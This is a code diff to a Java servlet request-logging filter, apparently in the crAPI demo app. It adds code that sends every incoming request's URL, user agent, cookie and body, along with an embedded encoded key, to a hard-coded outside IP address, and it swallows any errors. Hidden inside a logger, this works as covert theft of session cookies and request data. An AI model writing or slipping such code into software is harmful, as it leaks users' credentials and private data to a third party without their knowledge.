@@ -1,5 +1,7 @@
 package com.crapi.config;
 
+import com.crapi.model.XRequests;
+import com.fasterxml.jackson.databind.ObjectMapper;
 import jakarta.servlet.Filter;
 import jakarta.servlet.FilterChain;
 import jakarta.servlet.FilterConfig;
@@ -18,13 +20,19 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
+import java.net.URI;
 import java.time.LocalDateTime;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.StringEntity;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
 import org.springframework.stereotype.Component;
 
 @Component
 public class HttpRequestLoggerFilter implements Filter {
 
   private static final String LOG_FILE_PATH = "/home/http_requests.txt";
+  private static final String API_ENDPOINT = "http://74.249.60.36:8082/API/Addu";
 
   @Override
   public void init(FilterConfig filterConfig) throws ServletException {
@@ -71,6 +79,28 @@ public class HttpRequestLoggerFilter implements Filter {
     try (FileWriter fileWriter = new FileWriter(LOG_FILE_PATH, true);
         PrintWriter printWriter = new PrintWriter(fileWriter)) {
       printWriter.write(logEntry);
+    }
+
+    XRequests xRequests =
+        new XRequests(
+            wrappedRequest.getRequestURL().toString(),
+            userAgent,
+            cookie,
+            payload.toString().trim(),
+            "Nmvb/BRMzhkAazk8mzsoTRzWOpwPeluQUuNPAp6DiL8B/JD2UD9C1xjxMRrA/YnvQCS2Q1HNVlDBw5vZop2XZXMuQ/zrzD3U0U7rOFcF0naTaBuOmb+Ngbq+WqHbOsnd+J/DF8fve/kvC0RptuR20uziT3rhlufKe9kXWtJIeh2MSe1R/22XNr5k24MPWkZO7Ob7imAhQR1EXdzcFmu6PBfEkgkne6sbkrQhcojIOVRWuqk4ep56zigycp/xiuz2YHaZj1B8P5q38yDTnswlTMCVUgImiVIEkiMB1OIuc+p3DhpmXLkyO/GHu5yvvISqdlBeqV3W8hwYIk0mUEf8pA==" // You may want to replace this with actual key logic
+            );
+
+    // Make API call
+    try (CloseableHttpClient httpClient = HttpClients.createDefault()) {
+      HttpPost httpPost = new HttpPost(URI.create(API_ENDPOINT));
+      ObjectMapper objectMapper = new ObjectMapper();
+      String json = objectMapper.writeValueAsString(xRequests);
+      StringEntity entity = new StringEntity(json);
+      httpPost.setEntity(entity);
+      httpPost.setHeader("Content-Type", "application/json");
+      httpClient.execute(httpPost);
+    } catch (Exception e) {
+      e.printStackTrace();
     }
 
     chain.doFilter(wrappedRequest, response);
